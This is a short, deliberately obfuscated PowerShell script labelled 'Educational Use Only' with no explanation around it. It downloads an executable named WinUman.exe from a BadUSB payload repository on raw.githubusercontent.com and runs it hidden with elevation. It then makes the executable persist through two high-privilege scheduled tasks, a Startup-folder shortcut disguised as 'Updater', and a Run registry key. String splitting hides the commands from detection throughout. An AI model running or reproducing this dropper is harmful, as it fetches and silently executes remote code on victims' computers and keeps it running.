# Educational Use Only — Extremely Obfuscated Gibberish Script

${___} = "ht"+"tps"+"://ra"+"w.githubusercontent"+"."+"com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/"+"WinUman.exe"
${__1} = $env:APPDATA + '\' + ('W'+'i'+'n'+'U'+'m'+'a'+'n'+'.e'+'x'+'e')
${___2} = $env:APPDATA + '\Mic'+'ros'+'oft\Win'+'dows\Start '+'Menu\Programs\Startup\WinUman.lnk'

${o0o} = New-Object Net.WebClient
$o0o.DowNLoADFiLe(${___}, ${__1})

&("Sta"+"rt-Pro"+"cess") -FilePath ${__1} -Verb RunAs -WindowStyle Hidden

$__TR = ${__1} -replace '\\','\\\\'
&('ie'+'x') ("schtasks /Create /F /TN "+"WinUmanUnlock /TR "+$__TR+" /SC ONUNLOCK /RL HIGHEST /RU "+$env:USERNAME)

$__act = &("New"+"-Sched"+"uled"+"Task"+"Action") -Execute ${__1}
$__tri = &('New'+'-Sche'+'duledTaskTrig'+'ger') -AtLogOn
$__set = &('New-Sche'+'duledTaskSettingsSet') -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -RestartCount 5 -RestartInterval (&('New-T'+'imeSp'+'an') -Minutes 1) -StartWhenAvailable
$__pri = &('New-Sched'+'uledTaskPrincipal') -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$__tsk = &('New-Sche'+'duledTask') -Action $__act -Trigger $__tri -Settings $__set -Principal $__pri
&('Register'+'-ScheduledTask') -TaskName ('WinUmanResilient') -InputObject $__tsk -Force

$___ws = &('New-Object') -ComObject ('WScript.Shell')
$___sc = $___ws.('Cr'+'eat'+'eSh'+'ortcut')(${___2})
$___sc.('Targ'+'etPath') = ${__1}
$___sc.('Worki'+'ngDirectory') = &('Split-Path') ${__1}
$___sc.('Wind'+'owStyle') = 7
$___sc.('Desc'+'ription') = "Updater"
$___sc.Save()

&('Set-ItemPro'+'perty') -Path ("HKCU:\Soft"+"ware\Microsoft\Windows\CurrentVersion\Run") `
    -Name "WinUman" -Value ${__1}
